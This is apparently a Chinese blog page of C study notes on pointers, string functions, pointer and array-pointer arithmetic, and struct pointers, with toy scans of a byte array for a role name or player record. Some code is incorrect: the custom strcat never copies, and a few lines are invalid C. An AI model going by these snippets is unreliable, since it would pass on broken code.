class=\"title\">FindRoleNameAddr</span><span class=\"params\">(<span class=\"type\">char</span>* pData, <span class=\"type\">char</span>* pRoleName)</span> <span class=\"comment\">//返回值为指针的为指针函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//返回值为带*类型的函数为指针函数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;string.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> data[] = &#123;</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x01</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x04</span>,<span class=\"number\">0x05</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x09</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x20</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x0C</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x44</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x47</span>,<span class=\"number\">0x0C</span>,<span class=\"number\">0x0E</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0D</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x11</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x74</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x01</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x05</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x4F</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0D</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strlen</span><span class=\"params\">(<span class=\"type\">char</span>* s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*s != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tlen++;</span><br><span class=\"line\">\t\ts++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> len;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ret = dest;   <span class=\"comment\">//需要先保存首地址，后续dest指针会随着循环向后移，但返回时还是返回首地址</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((*dest++) = (*src++));   <span class=\"comment\">//这是赋值语句，0也会被复制，先复制在判断</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\twhile(*src != 0) </span></span><br><span class=\"line\"><span class=\"comment\">\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t*dest = *src;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tsrc++;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tdest++;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcat</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ret = dest;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*dest != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdest++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*dest != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t*dest = *src;</span><br><span class=\"line\">\t\tdest++;</span><br><span class=\"line\">\t\tsrc++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strcmp</span><span class=\"params\">(<span class=\"type\">char</span>* s1, <span class=\"type\">char</span>* s2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*s1 !=<span class=\"number\">0</span> || *s2 != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(*s1 == *s2)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\ts1++;</span><br><span class=\"line\">\t\t\ts2++;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">FindRoleNameAddr</span><span class=\"params\">(<span class=\"type\">char</span>* pData, <span class=\"type\">char</span>* pRoleName)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> total = <span class=\"built_in\">sizeof</span>(data)/<span class=\"built_in\">sizeof</span>(data[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"type\">int</span> length = <span class=\"built_in\">strlen</span>(pRoleName);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;=total-length; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(*(pData+i) == <span class=\"number\">0x57</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">strncmp</span>(&amp;pData[i],pRoleName,<span class=\"number\">3</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> &amp;pData[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> arr2[] = <span class=\"string\">&quot;WOW&quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,data);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,<span class=\"built_in\">FindRoleNameAddr</span>(data, arr2));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230126151524978.png\" alt=\"image-20230126151524978\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//指针数组</span><br><span class=\"line\">int*** arr[5];</span><br><span class=\"line\"></span><br><span class=\"line\">char a1 = &#x27;A&#x27;;</span><br><span class=\"line\">char* p1 = &amp;a1;</span><br><span class=\"line\"></span><br><span class=\"line\">char* arr = &quot;china&quot;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);  //china</span><br><span class=\"line\"></span><br><span class=\"line\">char arr[10] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);   //china</span><br><span class=\"line\">0040D7B8 C6 45 F4 63          mov         byte ptr [ebp-0Ch],63h</span><br><span class=\"line\">0040D7BC C6 45 F5 68          mov         byte ptr [ebp-0Bh],68h</span><br><span class=\"line\">0040D7C0 C6 45 F6 69          mov         byte ptr [ebp-0Ah],69h</span><br><span class=\"line\">0040D7C4 C6 45 F7 6E          mov         byte ptr [ebp-9],6Eh</span><br><span class=\"line\">0040D7C8 C6 45 F8 61          mov         byte ptr [ebp-8],61h</span><br><span class=\"line\">0040D7CC 33 C0                xor         eax,eax</span><br><span class=\"line\">0040D7CE 89 45 F9             mov         dword ptr [ebp-7],eax</span><br><span class=\"line\">0040D7D1 88 45 FD             mov         byte ptr [ebp-3],al</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char arr[5] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);   //china烫虉</span><br><span class=\"line\"></span><br><span class=\"line\">char arr[5] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%c\\n&quot;,arr);   //@</span><br><span class=\"line\"></span><br><span class=\"line\">char arr[6] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;,&#x27;\\0&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);   //china</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char* arr[] = &#123;&quot;if&quot;,&quot;or&quot;,&quot;while&quot;,&quot;for&quot;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">char* p1 = &quot;if&quot;</span><br><span class=\"line\">char* p2 = &quot;for&quot;;</span><br><span class=\"line\">char* p3 = &quot;while&quot;;</span><br><span class=\"line\">char* p4 = &quot;switch&quot;;</span><br><span class=\"line\">char* keyword[] = &#123;p1,p2,p3,p4&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">for(int i=0;i&lt;4;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    printf(&quot;%s\\n&quot;,*(arr+i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230224153206988.png\" alt=\"image-20230224153206988\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//结构体指针</span><br><span class=\"line\">struct Stu</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Stu* stu;</span><br><span class=\"line\">stu = (Stu*)100;</span><br><span class=\"line\">stu++;  //+12</span><br><span class=\"line\"></span><br><span class=\"line\">Stu* Stu1 = (Stu*)20;</span><br><span class=\"line\">int x = stu - stu1;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Stu s;</span><br><span class=\"line\">s.a = 10;</span><br><span class=\"line\">s.b = 20;</span><br><span class=\"line\">s.c = 30;</span><br><span class=\"line\">Stu *ss = &amp;s;</span><br><span class=\"line\">ss-&gt;a = 100;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int x = 10;</span><br><span class=\"line\">Stu* s = (Stu*)&amp;x;</span><br><span class=\"line\">printf(&quot;%d %d %d&quot;,s-&gt;a,s-&gt;b,s-&gt;c);   //10,x,x  x取决于内存中有什么</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int x1 = 1;</span><br><span class=\"line\">int x2 = 2;</span><br><span class=\"line\">int x3 = 3;</span><br><span class=\"line\"></span><br><span class=\"line\">int* arr[3];</span><br><span class=\"line\">arr[0] = &amp;x1;</span><br><span class=\"line\">arr[1] = &amp;x2;</span><br><span class=\"line\">arr[2] = &amp;x3;</span><br><span class=\"line\"></span><br><span class=\"line\">char* p1 = &quot;if&quot;</span><br><span class=\"line\">char* p2 = &quot;for&quot;;</span><br><span class=\"line\">char* p3 = &quot;while&quot;;</span><br><span class=\"line\">char* p4 = &quot;switch&quot;;</span><br><span class=\"line\">char* keyword[] = &#123;p1,p2,p3,p4&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">for(int i=0;i&lt;4;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    printf(&quot;%s\\n&quot;,*(arr+i));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230127133346425.png\" alt=\"image-20230127133346425\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TagPlayer</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> id;</span><br><span class=\"line\">\t<span class=\"type\">int</span> level;</span><br><span class=\"line\">&#125;Player;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> data[] = &#123;</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x01</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x04</span>,<span class=\"number\">0x05</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x09</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x20</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x0C</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x44</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x01</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x74</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x01</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x4F</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0D</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fun</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* haha = data;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"keyword\">sizeof</span>(data)/<span class=\"keyword\">sizeof</span>(data[<span class=\"number\">0</span>])-<span class=\"keyword\">sizeof</span>(Player); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tPlayer* hehe = (Player*)(haha+i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(hehe-&gt;id == <span class=\"number\">0x01</span> &amp;&amp; hehe-&gt;level == <span class=\"number\">0x08</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\ %d \\n&quot;</span>,&amp;(hehe-&gt;id),hehe-&gt;id);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfun();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(p1+x)  = p1[x]</span><br><span class=\"line\">两种写法一样</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span>** p2;</span><br><span class=\"line\">*(*(p2+<span class=\"number\">1</span>)) +<span class=\"number\">4</span></span><br><span class=\"line\">*(*(p2+<span class=\"number\">1</span>)+<span class=\"number\">1</span>) +<span class=\"number\">4</span>+<span class=\"number\">1</span></span><br><span class=\"line\">*(*(p2+<span class=\"number\">2</span>)+<span class=\"number\">3</span>) == p2[<span class=\"number\">2</span>][<span class=\"number\">3</span>]  +<span class=\"number\">8</span>+<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span>*** p3;</span><br><span class=\"line\">*(*(*(p3+<span class=\"number\">1</span>)+<span class=\"number\">2</span>)+<span class=\"number\">3</span>) == p3[<span class=\"number\">1</span>][<span class=\"number\">2</span>][<span class=\"number\">3</span>]  +<span class=\"number\">4</span>+<span class=\"number\">8</span>+<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//结构体指针</span></span><br><span class=\"line\">Student* s;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//数组指针</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> (*px)[<span class=\"number\">5</span>];  </span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">sizeof</span>(px));  <span class=\"comment\">//4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//赋值</span></span><br><span class=\"line\">px = ((*px)[<span class=\"number\">5</span>])<span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//*px 指向 int[5]</span></span><br><span class=\"line\">px++;  +<span class=\"number\">20</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">16</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>&#125;;</span><br><span class=\"line\"><span class=\"built_in\">int</span> (*px)[<span class=\"number\">2</span>];</span><br><span class=\"line\">px = (<span class=\"built_in\">int</span> (*px)[<span class=\"number\">2</span>])arr;  </span><br><span class=\"line\">*px == 